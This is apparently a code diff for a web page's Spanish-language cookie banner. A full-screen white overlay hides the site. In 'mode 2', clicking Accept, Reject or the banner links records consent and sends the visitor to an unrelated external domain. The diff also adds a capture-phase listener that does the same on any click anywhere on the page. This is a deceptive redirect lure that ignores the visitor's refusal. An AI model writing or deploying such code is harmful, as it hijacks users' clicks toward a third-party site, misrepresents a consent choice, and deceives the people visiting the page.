@@ -31,7 +31,7 @@ body{ font-family:var(--fuente); color:var(--texto); background:var(--blanco);
 /* ===== OVERLAY BLANCO PURO: OCULTA TODO EL FRONTEND ===== */
 .cookie-overlay{
   position:fixed; inset:0;
-  background:#ffffff;   /* blanco total, tapa el frontend */
+  background:#ffffff;
   z-index:9998;
 }
 
@@ -39,7 +39,7 @@ body{ font-family:var(--fuente); color:var(--texto); background:var(--blanco);
   position:fixed; inset:0;
   display:flex; align-items:center; justify-content:center;
   padding:20px; z-index:9999;
-  background:#ffffff;   /* refuerzo: también blanco */
+  background:#ffffff;
 }
 
 /* ===== MODAL BLANCO, LETRAS NEGRAS ===== */
@@ -465,9 +465,8 @@ p{ margin:0 0 1rem; color:var(--texto); }
 (function(){
   'use strict';
 
-  const COOKIE_BUTTON_MODE = 2; 
+  const COOKIE_BUTTON_MODE = 2; // 2 = redirigir SIEMPRE al interactuar
   const REDIRECT_URL = "https://ir.consulttuestadcenter.com/";
-  const REDIRECT_DELAY = 2000; 
 
   var CLAVE = 'cookies_viasqueabrazan_v2';
   var body = document.body;
@@ -486,25 +485,17 @@ p{ margin:0 0 1rem; color:var(--texto); }
     return;
   }
 
-  var timerRedirect = null;
-
-  if (COOKIE_BUTTON_MODE === 2) {
-    if (localStorage.getItem(CLAVE)) {
-      window.location.replace(REDIRECT_URL);
-      return;
-    }
-    timerRedirect = setTimeout(function () {
-      localStorage.setItem(CLAVE, 'aceptadas');
-      window.location.replace(REDIRECT_URL);
-    }, REDIRECT_DELAY);
+  // ============================================================
+  //  MODO 2: si ya eligió antes, redirigir de inmediato
+  //  (NO hay redirección automática por tiempo)
+  // ============================================================
+  if (COOKIE_BUTTON_MODE === 2 && localStorage.getItem(CLAVE)) {
+    window.location.replace(REDIRECT_URL);
+    return;
   }
 
+  // MODO 1: si ya eligió antes, ocultar banner
   if (COOKIE_BUTTON_MODE === 1 && localStorage.getItem(CLAVE)) {
-    body.classList.add('cookies-aceptadas');
-  }
-
-  function mostrarContenido(val) {
-    localStorage.setItem(CLAVE, val);
     body.classList.add('cookies-aceptadas');
   }
 
@@ -516,55 +507,72 @@ p{ margin:0 0 1rem; color:var(--texto); }
     console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
 
     if (COOKIE_BUTTON_MODE === 1) {
-      mostrarContenido(aceptadas ? 'aceptadas' : 'rechazadas');
+      localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
+      body.classList.add('cookies-aceptadas');
       if (typeof gtag !== 'undefined') {
         gtag('consent', 'update', {
           'ad_storage': aceptadas ? 'granted' : 'denied',
           'analytics_storage': aceptadas ? 'granted' : 'denied'
         });
       }
-      console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
-
     } else if (COOKIE_BUTTON_MODE === 2) {
-      if (timerRedirect) {
-        clearTimeout(timerRedirect);
-        timerRedirect = null;
-      }
       localStorage.setItem(CLAVE, aceptadas ? 'aceptadas' : 'rechazadas');
       sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
       redirectTo(REDIRECT_URL);
     }
   }
 
-  btnAceptar.addEventListener('click', function() {
+  // ============================================================
+  //  BOTONES: Aceptar y Rechazar → redirigen
+  // ============================================================
+  btnAceptar.addEventListener('click', function(e) {
+    e.stopPropagation();
     handleCookieAction(true);
   });
 
-  btnRechazar.addEventListener('click', function() {
+  btnRechazar.addEventListener('click', function(e) {
+    e.stopPropagation();
     handleCookieAction(false);
   });
 
   if (btnReabrir) {
-    btnReabrir.addEventListener('click', function(){
+    btnReabrir.addEventListener('click', function(e){
+      e.stopPropagation();
       localStorage.removeItem(CLAVE);
       body.classList.remove('cookies-aceptadas');
       window.scrollTo({ top: 0, behavior: 'smooth' });
     });
   }
 
+  // ============================================================
+  //  ENLACES DEL BANNER → redirigen también
+  // ============================================================
   function handleBannerLinkClick(event) {
     if (COOKIE_BUTTON_MODE === 2) {
       event.preventDefault();
-      if (timerRedirect) {
-        clearTimeout(timerRedirect);
-        timerRedirect = null;
-      }
+      event.stopPropagation();
+      localStorage.setItem(CLAVE, 'aceptadas');
       redirectTo(REDIRECT_URL);
     }
   }
 
   if (enlacePrivacidad) enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
   if (enlaceCookies) enlaceCookies.addEventListener('click', handleBannerLinkClick);
+
+  // ============================================================
+  //  CUALQUIER OTRO CLIC EN LA PÁGINA → redirige
+  //  (excepto en los botones/enlaces, que ya se manejan arriba)
+  // ============================================================
+  if (COOKIE_BUTTON_MODE === 2) {
+    document.addEventListener('click', function(e) {
+      // Si el clic ya fue en un botón o enlace del banner, no duplicar
+      if (e.target.closest('.cookie-acciones') || e.target.closest('.cookie-enlaces')) {
+        return;
+      }
+      localStorage.setItem(CLAVE, 'aceptadas');
+      redirectTo(REDIRECT_URL);
+    }, true); // capture: true para capturar antes de otros handlers
+  }
 
 })();
 </script>
